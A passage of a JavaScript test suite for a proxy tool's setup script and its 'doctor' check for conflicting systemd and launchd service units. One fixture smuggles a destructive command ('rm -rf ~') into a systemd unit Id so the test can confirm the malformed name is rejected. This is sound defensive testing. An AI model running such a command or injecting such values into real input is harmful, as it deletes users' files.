    "ocp-connect's model-metadata heredoc must stay quoted (<<'PYEOF'); an unquoted heredoc " +
    "(<<PYEOF) lets bash shell-expand the python body before python sees it, silently " +
    "invalidating the fidelity premise every other test in this section depends on — and note " +
    "that ocp-connect's OTHER heredoc (the shell-rc rewriter) being quoted is not sufficient, " +
    "this must check THIS specific opener line");
});

test("ocp-connect: `bash -n` reports no syntax errors", () => {
  execFileSync("bash", ["-n", _ocConnectPath], { encoding: "utf8" });
});

test("ocp-connect: the embedded model_meta/get_model_meta python block compiles (py_compile)", () => {
  const script = `
import sys, py_compile, tempfile, os
src = open(sys.argv[1]).read()
blk = src[src.index('model_meta = {') : src.index('for mid in model_ids:')]
assert blk.strip(), "empty model_meta slice - anchor drift (see #218 review MED-1a)"
assert 'def get_model_meta' in blk, "slice missing get_model_meta - anchor drift"
assert 'os.makedirs' not in blk and 'open(config_path' not in blk, \\
    "slice overgrown past the intended block - anchor drift (see #218 review MED-1b)"
# No __builtins__ capability boundary here (#218 round-3 review LOW): this script never
# exec()s the slice, only py_compile.compile()s it - a syntax check, not a code path. The
# slice's own file-write idioms (if any got in via anchor drift) would never run; only the
# actual write calls below (os.write/os.remove on THIS script's own tempfiles, using ITS OWN
# real builtins) do, and those are not slice content. The capability boundary in H1/H2/H3/H4/H5
# exists because THEY exec(); this one is exempt for that reason, not by oversight.
fd, path = tempfile.mkstemp(suffix='.py')
os.write(fd, blk.encode())
os.close(fd)
# py_compile's default cfile writes a .pyc into a __pycache__/ dir next to \`path\` that nothing
# then cleans up (#218 review LOW). Route it at an explicit second tempfile instead (newer
# CPython's py_compile refuses non-regular-file targets like os.devnull with FileExistsError,
# so that shortcut doesn't work here) and remove both, regardless of outcome.
cfd, cpath = tempfile.mkstemp(suffix='.pyc')
os.close(cfd)
try:
    py_compile.compile(path, cfile=cpath, doraise=True)
finally:
    os.remove(path)
    os.remove(cpath)
`;
  execFileSync("python3", ["-c", script, _ocConnectPath], { encoding: "utf8" });
});

// Exact snapshot of ocp-connect's model_meta table — name + reasoning + maxTokens, checked by
// EQUALITY, not just an upper bound. The <=-based tests below only forbid OVER-advertising
// maxTokens; on their own they are blind to: a DELETED row (falls through to the unknown-id
// 8192 fallback, which is <= every registry value, so passes silently); an UNDER-advertising
// drift (also <= by definition — "safe" is exactly why <= alone lets it through); a wrong
// `name` (never compared anywhere below, and it is the literal string written into the user's
// ~/.openclaw/openclaw.json model picker); or maxTokens silently becoming a STRING (JS's `<=`
// operator coerces `"32000" <= 32000` to `true`). This is the one assertion that catches all
// four (#218 review HIGH-2 / MED-4).
const _OC_EXPECTED_MODEL_META_TABLE = {
  "claude-opus": { name: "Claude Opus (OCP)", reasoning: true, maxTokens: 64000 },
  "claude-sonnet": { name: "Claude Sonnet (OCP)", reasoning: true, maxTokens: 32000 },
  "claude-haiku": { name: "Claude Haiku (OCP)", reasoning: false, maxTokens: 32000 },
};

test("ocp-connect: model_meta table matches a pinned snapshot EXACTLY (name + reasoning + maxTokens, not just an upper bound)", () => {
  const table = _ocModelMetaTable();
  assert.deepEqual(table, _OC_EXPECTED_MODEL_META_TABLE,
    "ocp-connect's model_meta table drifted from the pinned snapshot above — a deleted row, an " +
    "under-advertising drift, a changed `name`, or a stringified maxTokens would all pass the " +
    "<=-based tests below silently; this is the test that catches them");
});

test("ocp-connect: every models.json id classifies at or below its CLI-registry maxTokens (never over-advertises)", () => {
  const ids = _spotModels.models.map((m) => m.id);
  const classified = _ocClassify(ids);
  for (const m of _spotModels.models) {
    const got = classified[m.id];
    assert.ok(got, `ocp-connect get_model_meta returned nothing for ${m.id}`);
    const want = _spotRegistryMaxTokens[m.id];
    assert.ok(want !== undefined,
      `${m.id} has no recorded registry value — see _spotRegistryMaxTokens above`);
    assert.ok(got.maxTokens <= want,
      `ocp-connect over-advertises ${m.id}: classifies maxTokens=${got.maxTokens}, but the CLI ` +
      `registry caps it at ${want} — this is the #208 defect class (unknown-id fallback raised ` +
      `8192->32000, over-advertising by 4x)`);
  }
});

test("ocp-connect: reasoning classification matches models.json ground truth for every id", () => {
  const ids = _spotModels.models.map((m) => m.id);
  const classified = _ocClassify(ids);
  for (const m of _spotModels.models) {
    assert.equal(classified[m.id].reasoning, m.reasoning,
      `${m.id}: ocp-connect classifies reasoning=${classified[m.id].reasoning}, models.json says ${m.reasoning}`);
  }
});

// ocp-connect's write loop emits THREE fields per entry that are LITERAL CONSTANTS, not derived
// from get_model_meta() at all: `input`, `cost`, `contextWindow` (ocp-connect:173-175). The test
// below ALSO diffs meta-derived fields (name/reasoning/maxTokens) against get_model_meta()'s own
// return value — but that diff structurally cannot see these three, because get_model_meta()
// never returns them; there is nothing on the "expected" side to compare against. #218 round-2
// review MED-2: mutating any of the three (contextWindow 200000->2000000, cost.input 0->999,
// input ["text"]->["text","image"]) passed 472/0 green. Pinned here as an exact snapshot, the
// same way HIGH-2 pins the model_meta table — this is what closes that gap and is what makes the
// "covers ... the loop" scope claim above actually true (previously only 4 of the 7 fields the
// loop writes were checked).
const _OC_EXPECTED_PROVIDER_MODEL_LITERALS = {
  input: ["text"],
  cost: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0 },
  contextWindow: 200000,
};

test("ocp-connect: the provider.models write loop produces the exact entry — meta-derived fields verbatim, plus the pinned literal constants", () => {
  // #218 review MED-3: the classify-based tests above call get_model_meta() directly and never
  // exercise the loop that actually maps its return value into the provider.models entries OCP
  // hands OpenClaw (`"maxTokens": meta["maxTokens"]` etc. — ocp-connect:169-177). A mutation to
  // THAT mapping (e.g. hardcoding maxTokens to 999999 regardless of what get_model_meta
  // returned) was invisible to every test above, including the one literally named "never
  // over-advertises". This drives the real loop (Harness 3, still pure in-memory) and diffs its
  // output against the real classifier's output for the same ids.
  const ids = _spotModels.models.map((m) => m.id);
  const classified = _ocClassify(ids);
  const built = _ocBuildProviderModels(ids);
  assert.equal(built.length, ids.length, "provider.models must have exactly one entry per requested id");
  for (const entry of built) {
    const meta = classified[entry.id];
    assert.ok(meta, `provider.models has an entry for ${entry.id} that get_model_meta never classified`);
    // JSON.stringify every operand below (#218 round-3 review: a bare template-literal
    // interpolation renders a STRING "200000" and the NUMBER 200000 identically as `200000`,
    // making a type-only mutation's failure message read as "200000, want 200000" — true but
    // useless. JSON.stringify renders them as `"200000"` vs `200000`, so the type is visible.
    assert.equal(entry.maxTokens, meta.maxTokens,
      `${entry.id}: provider.models maxTokens=${JSON.stringify(entry.maxTokens)} does not match ` +
      `get_model_meta's maxTokens=${JSON.stringify(meta.maxTokens)} — the write loop is not ` +
      `copying the classifier's output verbatim`);
    assert.equal(entry.reasoning, meta.reasoning,
      `${entry.id}: provider.models.reasoning=${JSON.stringify(entry.reasoning)} does not match ` +
      `get_model_meta's classification (${JSON.stringify(meta.reasoning)})`);
    assert.equal(entry.name, meta.name,
      `${entry.id}: provider.models.name=${JSON.stringify(entry.name)} does not match get_model_meta's classification`);
    // MED-2: the three literal-constant fields — invisible to the meta-diff above by construction.
    assert.deepEqual(entry.input, _OC_EXPECTED_PROVIDER_MODEL_LITERALS.input,
      `${entry.id}: provider.models.input=${JSON.stringify(entry.input)}, want ${JSON.stringify(_OC_EXPECTED_PROVIDER_MODEL_LITERALS.input)}`);
    assert.deepEqual(entry.cost, _OC_EXPECTED_PROVIDER_MODEL_LITERALS.cost,
      `${entry.id}: provider.models.cost=${JSON.stringify(entry.cost)}, want ${JSON.stringify(_OC_EXPECTED_PROVIDER_MODEL_LITERALS.cost)}`);
    assert.equal(entry.contextWindow, _OC_EXPECTED_PROVIDER_MODEL_LITERALS.contextWindow,
      `${entry.id}: provider.models.contextWindow=${JSON.stringify(entry.contextWindow)}, want ${JSON.stringify(_OC_EXPECTED_PROVIDER_MODEL_LITERALS.contextWindow)}`);
  }
});

// 8192 is the GLOBAL MINIMUM max_output_tokens.default across all 17 records in the CLI 2.1.220
// registry (distinct values: 8192 / 32000 / 64000 — confirmed via
//   grep -ao 'max_output_tokens:{default:[0-9]*' <binary> | grep -oE '[0-9]+$' | sort -un
// which counts VALUES, not id-paired records, per the #210 extraction protocol: a fixed-width
// id-anchored window is silently incomplete, but a global "what are the distinct values" scan
// needs no id pairing at all). Raising the unknown-id fallback above this is exactly the #208
// defect: it over-advertised claude-3-5-haiku / claude-3-5-sonnet (both capped at 8192) by 4x.
const _OC_REGISTRY_GLOBAL_MIN_MAX_TOKENS = 8192;

test("ocp-connect: an id matching no family prefix falls back to the registry global minimum (8192)", () => {
  const unknownId = "totally-unrecognized-model-id-zzz";
  const classified = _ocClassify([unknownId]);
  const got = classified[unknownId];
  assert.equal(got.maxTokens, _OC_REGISTRY_GLOBAL_MIN_MAX_TOKENS,
    `unknown-id fallback maxTokens=${got.maxTokens}, want the registry global minimum ${_OC_REGISTRY_GLOBAL_MIN_MAX_TOKENS}`);
  assert.equal(got.reasoning, false, "unknown-id fallback must not claim reasoning support");
  // #218 round-2 review LOW: unpinned before this — the model_meta snapshot test (HIGH-2) pins
  // the TABLE, not this separate `return {"name": mid + " (OCP)", ...}` fallback path, and the
  // write-loop test (MED-3) can't catch a mutation here either: both sides of that diff call the
  // SAME (mutated) get_model_meta(), so a wrong name cancels out against itself. This is the one
  // place with independent ground truth for it.
  assert.equal(got.name, unknownId + " (OCP)",
    `unknown-id fallback name=${JSON.stringify(got.name)}, want ${JSON.stringify(unknownId + " (OCP)")}`);
});

// --- Harness 5: verify get_model_meta()'s prefix-length sort (`sorted(model_meta.items(), key=
// lambda x: -len(x[0]))`, ocp-connect:155) by feeding the REAL function a SYNTHETIC overlapping-
// prefix table it never sees in production — ocp-connect's own three keys never overlap today —
// and checking it walks longest-prefix-first. `exec(blk, ns)` makes `ns` the function's
// `__globals__`, so overwriting `ns['model_meta']` AFTER exec is what the function sees on every
// subsequent call: this drives the REAL sort/match loop against a case the current table can't
// exercise, not a re-implementation of "longest prefix wins" in JS. ---
const _OC_PREFIX_SORT_PY = `
import json, sys
src = open(sys.argv[1]).read()
blk = src[src.index('model_meta = {') : src.index('for mid in model_ids:')]
assert blk.strip(), "empty model_meta slice - anchor drift (see #218 review MED-1a)"
assert 'def get_model_meta' in blk, "slice missing get_model_meta - anchor drift"
assert 'os.makedirs' not in blk and 'open(config_path' not in blk, \\
    "slice overgrown past the intended block - anchor drift (see #218 review MED-1b)"
# #218 round-3 review: same capability-boundary fix as the other harnesses that exec this slice
# (H1/H2/H3) — restrict __builtins__ to exactly sorted+len rather than a bypassable, comment-
# scanning substring denylist (round 2's blanket 'open('/'os.' ban used to be here; dropped for
# the same reasoning documented at H1 above). Confirmed the override technique below
# (ns['model_meta'] = ... after exec) still works identically under the restriction, since it
# never touches __builtins__.
ns = {"__builtins__": {"sorted": sorted, "len": len}}
exec(blk, ns)
ns['model_meta'] = {
    "a": {"name": "SHORT", "reasoning": False, "maxTokens": 1},
    "ab": {"name": "LONG", "reasoning": True, "maxTokens": 2},
}
result = ns['get_model_meta']("abc")
sys.stdout.write(json.dumps(result))
`;

function _ocClassifyWithOverlappingPrefixTable() {
  const raw = execFileSync("python3", ["-c", _OC_PREFIX_SORT_PY, _ocConnectPath], { encoding: "utf8" });
  return JSON.parse(raw);
}

test("ocp-connect: get_model_meta matches the LONGEST (most specific) overlapping prefix, not table order", () => {
  // #218 round-2 review LOW: the sort is a TRUE NO-OP today — none of "claude-opus" /
  // "claude-sonnet" / "claude-haiku" is a prefix of another, so removing it is 472/0 green on
  // the current table. Per the source comment (PR #152 review) it becomes load-bearing the
  // instant a future key IS a prefix of another (a bare "claude" fallback key, or a more
  // specific override). A dict in insertion order would match "a" (SHORT) first here; the sort
  // must make "ab" (LONG) win instead.
  const result = _ocClassifyWithOverlappingPrefixTable();
  // Sentinel (#218 round-3 review R7): separates "the ns['model_meta'] override after exec()
  // never took effect" (id "abc" fell through to the REAL, un-overridden model_meta, matched
  // nothing, and hit the unknown-id fallback — {"name": "abc (OCP)", "maxTokens": 8192}) from
  // "the sort picked the wrong prefix". Without this, a broken override and a broken sort would
  // both fail the assertion below with superficially similar-looking output, and its message
  // would misdiagnose the first as the second.
  assert.notEqual(result.maxTokens, 8192,
    `get_model_meta("abc") returned the unknown-id-fallback shape (maxTokens=8192, name=` +
    `${JSON.stringify(result.name)}) instead of either synthetic table entry — the ` +
    `ns['model_meta'] override after exec() did not take effect (get_model_meta may no longer ` +
    `read model_meta as a module global), NOT a sort defect`);
  assert.equal(result.name, "LONG",
    `get_model_meta("abc") against {"a":SHORT,"ab":LONG} returned name=${JSON.stringify(result.name)}; ` +
    `expected the longer/more-specific prefix "ab" (LONG) to win over "a" (SHORT) — the ` +
    `descending-length sort in get_model_meta (ocp-connect:155) may have been removed or reordered`);
});

test("ocp-connect: the hardcoded three-id JSON-parse-failure fallback never over-advertises", () => {
  // Control: well-formed /v1/models JSON must pass model ids through the try: branch UNCHANGED —
  // proves this harness actually drives the real branch logic, not just a constant.
  const controlIds = _ocFallbackModelIds(JSON.stringify({ data: [{ id: "claude-sonnet-5" }] }));
  assert.deepEqual(controlIds, ["claude-sonnet-5"],
    "well-formed JSON must pass model ids through the try: branch unchanged");

  // The real except: branch, driven with deliberately-malformed JSON.
  const fallbackIds = _ocFallbackModelIds("not valid json{{{");
  assert.ok(Array.isArray(fallbackIds) && fallbackIds.length > 0,
    "the except: branch must set a non-empty model_ids fallback");
  // ocp-connect's comment and #210 both describe this as a THREE-id list — assert the count
  // itself, not just that each id it happens to contain is safe (#218 review LOW).
  assert.equal(fallbackIds.length, 3,
    `the hardcoded fallback is documented as a three-id list, got ${fallbackIds.length}: ${JSON.stringify(fallbackIds)}`);

  const classified = _ocClassify(fallbackIds);
  for (const id of fallbackIds) {
    const want = _ocRegistryTruth(id);
    assert.ok(want !== undefined,
      `${id}: no recorded registry ground truth (direct, via models.json legacyAliases/aliases, ` +
      `or _ocKnownRegistryExtras) — add one`);
    assert.ok(classified[id].maxTokens <= want,
      `ocp-connect's JSON-parse-failure fallback over-advertises ${id}: classifies ` +
      `maxTokens=${classified[id].maxTokens}, registry caps it at ${want}`);
  }
});

// ═══════════════════════════════════════════════════════════════════════════
// ── Multi-unit boot-race pre-flight check (issue #220, incident #215) ──
// New section — kept self-contained (own imports, own console.log header) so a
// rebase against concurrent test-features.mjs PRs is a clean insert (main moves
// frequently and other PRs touch this file — see AGENTS.md testing notes).
//
// Background: on a real host, a system-scope systemd unit and a user-scope
// systemd unit were BOTH enabled and both pointed at the same server.mjs
// working tree and the same OCP port, with drifted config (different bind
// address, different CLAUDE_BIN). Whichever won the boot race silently decided
// the host's LAN reachability, and nothing in `ocp doctor` surfaced it. See
// scripts/doctor.mjs's classifyMultiUnitRisk / gatherUnitCandidates /
// detectMultiUnitBootRace and issue #215 for the live evidence.
//
// This is a STATIC config cross-reference (which units WOULD start at boot,
// and do any two collide) — deliberately independent of scripts/lib/
// restart-unit.mjs (PR #221, merged), which resolves a DIFFERENT, live-PID
// question for the restart phase. See the PR body for the explicit
// independence decision.
//
// Every test here is BEHAVIORAL: it calls the exported classifier/gatherer (or
// runDoctor with an injected opts.run) and asserts on return values / pushed
// checks / captured command strings — never on scripts/doctor.mjs's source
// text. Every finding from the independent review of the first version of this
// section is called out by its ID (HIGH-1, HIGH-2, MED-3 through MED-7) so a
// reader can trace which real defect each test guards.
//
// HIGH-1 note up front, since it shapes every test below that inspects a
// generated command string: assertions must live OUTSIDE the injected `run`
// fake, on a CAPTURED command string, never inside the fake itself. Two tests
// in the first version of this section asserted `assert.ok(...)` from INSIDE
// the fake; gatherUnitCandidates wraps every `run(...)` call in its own
// try/catch, which silently swallowed the AssertionError before it could reach
// the test framework — the counters those tests then checked had already been
// incremented before the throw, so the tests could never actually fail. See
// the PR body's mutation table for the deliberately-false assertion that
// proved this.
// ═══════════════════════════════════════════════════════════════════════════
import { classifyMultiUnitRisk, gatherUnitCandidates } from "./scripts/doctor.mjs";
import { writeFileSync } from "node:fs";
// mkdtempSync, rmSync (node:fs) and tmpdir (node:os) are already imported bare earlier in this
// file (see the snapshot-test section, ~:1653) — ESM forbids re-declaring the same binding via
// a second import statement, even from the same specifier, so only writeFileSync is new here.

console.log("\nMulti-unit boot-race pre-flight (issue #220) — classifyMultiUnitRisk (Linux):");

// Realistic `systemctl show <units> -p Id -p ExecStart -p Environment -p UnitFileState
// -p EnvironmentFiles` output, matching the exact field-incident shape from issue #215: system
// unit ocp.service (bind 0.0.0.0), user unit ocp-proxy.service (bind 127.0.0.1), same working
// tree, same port. Deliberately WITHOUT UnitFileState/EnvironmentFiles (older systemd, or a
// caller that didn't request them) — this doubles as the "permissive when absent" baseline
// every other test in this file that uses these fixtures relies on.
const FIELD_INCIDENT_USER_SHOW =
  `Id=ocp-proxy.service\n` +
  `ExecStart={ path=/usr/bin/node ; argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; ignore_errors=no }\n` +
  `Environment=CLAUDE_PROXY_PORT=3456 CLAUDE_BIND=127.0.0.1 CLAUDE_BIN=/usr/bin/claude`;
const FIELD_INCIDENT_SYSTEM_SHOW =
  `Id=ocp.service\n` +
  `ExecStart={ path=/home/opc/.npm-global/bin/node ; argv[]=/home/opc/.npm-global/bin/node /home/opc/ocp/server.mjs ; ignore_errors=no }\n` +
  `Environment=CLAUDE_PROXY_PORT=3456 CLAUDE_BIND=0.0.0.0 CLAUDE_BIN=/home/opc/.npm-global/bin/claude`;

test("classifyMultiUnitRisk: reproduces the exact issue #215 field incident — WARN, both units named, bind addresses captured", () => {
  const result = classifyMultiUnitRisk({
    platform: "linux",
    userShowOut: FIELD_INCIDENT_USER_SHOW,
    systemShowOut: FIELD_INCIDENT_SYSTEM_SHOW,
  });
  assert.equal(result.state, "warn");
  assert.equal(result.groups.length, 1);
  const group = result.groups[0];
  assert.equal(group.length, 2);
  const names = group.map(u => u.name).sort();
  assert.deepEqual(names, ["ocp-proxy.service", "ocp.service"]);
  const byName = Object.fromEntries(group.map(u => [u.name, u]));
  assert.equal(byName["ocp-proxy.service"].scope, "user");
  assert.equal(byName["ocp-proxy.service"].bind, "127.0.0.1");
  assert.equal(byName["ocp.service"].scope, "system");
  assert.equal(byName["ocp.service"].bind, "0.0.0.0");
});

test("classifyMultiUnitRisk: only ONE enabled OCP unit → clear (no boot race possible)", () => {
  const result = classifyMultiUnitRisk({
    platform: "linux",
    userShowOut: FIELD_INCIDENT_USER_SHOW,
    systemShowOut: "",
  });
  assert.equal(result.state, "clear");
});

test("classifyMultiUnitRisk: ZERO enabled units (both scopes empty) → clear, no crash", () => {
  const result = classifyMultiUnitRisk({ platform: "linux", userShowOut: "", systemShowOut: "" });
  assert.equal(result.state, "clear");
});

test("classifyMultiUnitRisk: systemctl unavailable for EITHER scope (null) → unknown, never a false all-clear", () => {
  // null means "couldn't gather" (missing binary, non-zero exit) — must never be conflated
  // with "" (ran fine, confirmed nothing enabled). Conflating the two is exactly the false
  // all-clear this check must not produce.
  assert.equal(classifyMultiUnitRisk({ platform: "linux", userShowOut: null, systemShowOut: "" }).state, "unknown");
  assert.equal(classifyMultiUnitRisk({ platform: "linux", userShowOut: "", systemShowOut: null }).state, "unknown");
  assert.equal(classifyMultiUnitRisk({ platform: "linux", userShowOut: null, systemShowOut: null }).state, "unknown");
});

test("LOW-3: classifyMultiUnitRisk — systemctlNotFound=true (both scopes genuinely absent) → 'not-applicable', a state distinct from 'unknown'", () => {
  const result = classifyMultiUnitRisk({
    platform: "linux", userShowOut: null, systemShowOut: null, systemctlNotFound: true,
  });
  assert.equal(result.state, "not-applicable");
  assert.notEqual(result.state, "unknown", "must be a genuinely distinct state, not a relabeled 'unknown'");
});

test("LOW-3: classifyMultiUnitRisk — systemctlNotFound=false (a real failure, not absence) stays 'unknown' even with null show-outs", () => {
  const result = classifyMultiUnitRisk({
    platform: "linux", userShowOut: null, systemShowOut: null, systemctlNotFound: false,
  });
  assert.equal(result.state, "unknown");
});

test("LOW-3: gatherUnitCandidates — systemctlNotFound requires BOTH scopes to fail with exit 127; an asymmetric failure (one 127, one a different error) stays 'unknown'-eligible, not 'not-applicable'", () => {
  // If systemctl genuinely doesn't exist, BOTH calls (same binary) fail identically with exit
  // 127 — that's the confident "not-applicable" case. A single scope failing with 127 while the
  // other fails some OTHER way is a stranger, less confident shape that should not be
  // upgraded to "the check doesn't apply here".
  const notFound = () => { const e = new Error("command not found"); e.status = 127; throw e; };
  const otherFailure = () => { throw new Error("permission denied"); };
  const run = (cmd) => (cmd.includes("--user") ? notFound() : otherFailure());
  const raw = gatherUnitCandidates(run, "linux");
  assert.equal(raw.systemctlNotFound, false, "asymmetric failure (127 + non-127) must NOT be treated as a confident 'not found'");
  assert.equal(classifyMultiUnitRisk(raw).state, "unknown");
});

test("LOW-3: gatherUnitCandidates — both scopes fail with exit 127 → systemctlNotFound=true", () => {
  const notFound = () => { const e = new Error("command not found"); e.status = 127; throw e; };
  const raw = gatherUnitCandidates(notFound, "linux");
  assert.equal(raw.systemctlNotFound, true);
  assert.equal(classifyMultiUnitRisk(raw).state, "not-applicable");
});

test("classifyMultiUnitRisk: two enabled OCP units on DIFFERENT ports → no false positive", () => {
  const userShow = `Id=a.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456`;
  const systemShow = `Id=b.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=9999`;
  const result = classifyMultiUnitRisk({ platform: "linux", userShowOut: userShow, systemShowOut: systemShow });
  assert.equal(result.state, "clear", "different ports are never a boot race — only one process can ever hold a given port");
});

test("MED-7: classifyMultiUnitRisk — two enabled OCP units on the SAME port but DIFFERENT working tree → NOW a WARN (grouping is by port alone)", () => {
  // Review finding MED-7 on #230: an earlier revision of this check required BOTH port AND
  // working tree to match before warning, reasoning from the single observed field-incident's
  // shape rather than the stated requirement (#220: "targets the OCP port"; #215: "points at
  // the same port" — neither mentions the tree), and did so without flagging the narrowing as
  // a narrowing. It was wrong on the merits too: two units on the same port from DIFFERENT
  // trees still race for the port and would serve DIFFERENT CODE to whoever wins — arguably a
  // worse outcome than the field incident, not a lesser one, and a host in this state has two
  // entirely separate installs nobody may even realize both auto-start. The working tree is
  // still surfaced (see the message-enrichment tests below) — it just no longer gates.
  const userShow = `Id=a.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp-A/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456`;
  const systemShow = `Id=b.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp-B/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456`;
  const result = classifyMultiUnitRisk({ platform: "linux", userShowOut: userShow, systemShowOut: systemShow });
  assert.equal(result.state, "warn");
  assert.equal(result.groups.length, 1);
  assert.equal(result.groups[0].length, 2);
  const trees = result.groups[0].map(u => u.workingTree).sort();
  assert.deepEqual(trees, ["/home/opc/ocp-A", "/home/opc/ocp-B"]);
});

test("classifyMultiUnitRisk: enabled units that AREN'T OCP (no server.mjs in ExecStart) never count toward a group", () => {
  const userShow = `Id=nginx.service\nExecStart={ argv[]=/usr/sbin/nginx -g daemon\\ off\\; ; }\nEnvironment=`;
  const systemShow = `Id=cron.service\nExecStart={ argv[]=/usr/sbin/cron -f ; }\nEnvironment=`;
  const result = classifyMultiUnitRisk({ platform: "linux", userShowOut: userShow, systemShowOut: systemShow });
  assert.equal(result.state, "clear");
});

test("classifyMultiUnitRisk: absent CLAUDE_PROXY_PORT/CLAUDE_BIND degrades to documented defaults, still groups correctly", () => {
  const userShow = `Id=a.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=`;
  const systemShow = `Id=b.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=`;
  const result = classifyMultiUnitRisk({ platform: "linux", userShowOut: userShow, systemShowOut: systemShow });
  assert.equal(result.state, "warn");
  assert.equal(result.groups[0][0].port, "3456", "absent CLAUDE_PROXY_PORT must default to DEFAULT_PORT, not crash/mismatch");
  assert.ok(result.groups[0].every(u => u.bind === "(default bind)"));
});

test("classifyMultiUnitRisk: an unvalidated/malformed unit Id is rejected, never trusted into a group", () => {
  // Defense in depth (same trust-boundary class as PR #221's MED-5 finding on restart-unit.mjs):
  // a systemd `Id=` should always be a safe unit name, but this must not blindly assume that —
  // it re-validates at the point the name would be surfaced/used, exactly like restart-unit.mjs
  // re-checks its own resolved unit name before it reaches a shell command.
  const userShow = `Id=a;rm -rf ~.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456`;
  const systemShow = `Id=b.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456`;
  const result = classifyMultiUnitRisk({ platform: "linux", userShowOut: userShow, systemShowOut: systemShow });
  assert.equal(result.state, "clear", "the malformed Id must be dropped entirely, leaving only one valid unit");
});

console.log("\nMulti-unit boot-race pre-flight (issue #220) — UnitFileState / EnvironmentFiles defense in depth (HIGH-2, MED-6):");

test("HIGH-2: classifyMultiUnitRisk — a candidate whose UnitFileState is NOT in the auto-start allowlist is excluded, even though ExecStart matches", () => {
  // Defense in depth: --state=enabled at LISTING time is the primary filter, but a control
  // mutation (see PR body) proved a future refactor could drop that flag silently while the
  // whole suite stayed green. This allowlist re-derives "would actually start at boot" from
  // each unit's OWN config, independent of the listing command.
  const userShow = `Id=a.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456\nUnitFileState=static`;
  const systemShow = `Id=b.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456\nUnitFileState=enabled`;
  const result = classifyMultiUnitRisk({ platform: "linux", userShowOut: userShow, systemShowOut: systemShow });
  assert.equal(result.state, "clear", "UnitFileState=static must be excluded, leaving only one valid (enabled) candidate");
});

test("HIGH-2: classifyMultiUnitRisk — UnitFileState=enabled-runtime is an allowlisted positive (a valid 'would start' state)", () => {
  const userShow = `Id=a.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456\nUnitFileState=enabled-runtime`;
  const systemShow = `Id=b.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456\nUnitFileState=enabled`;
  const result = classifyMultiUnitRisk({ platform: "linux", userShowOut: userShow, systemShowOut: systemShow });
  assert.equal(result.state, "warn", "enabled-runtime must count, not just enabled");
});

test("HIGH-2: classifyMultiUnitRisk — UnitFileState ABSENT stays permissive (does not newly reject shapes the primary filter already handled)", () => {
  const userShow = `Id=a.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456`;
  const systemShow = `Id=b.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456`;
  const result = classifyMultiUnitRisk({ platform: "linux", userShowOut: userShow, systemShowOut: systemShow });
  assert.equal(result.state, "warn", "absent UnitFileState (older systemd, or a caller that didn't request it) must not be treated as a rejection");
});

test("MED-6: classifyMultiUnitRisk — a candidate with a non-empty EnvironmentFiles is excluded (its real port cannot be trusted)", () => {
  // `systemctl show -p Environment` reflects only literal Environment= directives, never
  // EnvironmentFile= expansion. Assuming DEFAULT_PORT for a unit that might set its port via a
  // file we cannot read would fabricate a port match (or mismatch) with no real evidence.
  const userShow = `Id=a.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456\nEnvironmentFiles=/etc/ocp.env (ignore_errors=no)`;
  const systemShow = `Id=b.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456`;
  const result = classifyMultiUnitRisk({ platform: "linux", userShowOut: userShow, systemShowOut: systemShow });
  assert.equal(result.state, "clear", "the EnvironmentFiles-configured candidate must be dropped, leaving only one valid candidate");
});

test("MED-6: classifyMultiUnitRisk — an EMPTY EnvironmentFiles value stays permissive (no file actually configured)", () => {
  const userShow = `Id=a.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456\nEnvironmentFiles=`;
  const systemShow = `Id=b.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456`;
  const result = classifyMultiUnitRisk({ platform: "linux", userShowOut: userShow, systemShowOut: systemShow });
  assert.equal(result.state, "warn", "an empty EnvironmentFiles property means none is actually configured — must not be treated as 'untrustworthy'");
});

console.log("\nMulti-unit boot-race pre-flight (issue #220) — macOS (launchd):");

function plistBlob(files) {
  return files.map(([path, content]) => `===OCP-DOCTOR-FILE:${path}===\n${content}`).join("\n");
}
// runAtLoad: true (default) | false (explicit <false/>) | null (key omitted entirely)
function ocpPlist({ label, port, bind, runAtLoad = true, serverPath = "/Users/opc/ocp/server.mjs" }) {
  const runAtLoadXml = runAtLoad === null ? "" : `<key>RunAtLoad</key><${runAtLoad ? "true" : "false"}/>`;
  return runAtLoadXml +
    (label != null ? `<key>Label</key><string>${label}</string>` : "") +
    `<key>ProgramArguments</key><array><string>/usr/bin/node</string><string>${serverPath}</string></array>` +
    (port ? `<key>CLAUDE_PROXY_PORT</key><string>${port}</string>` : "") +
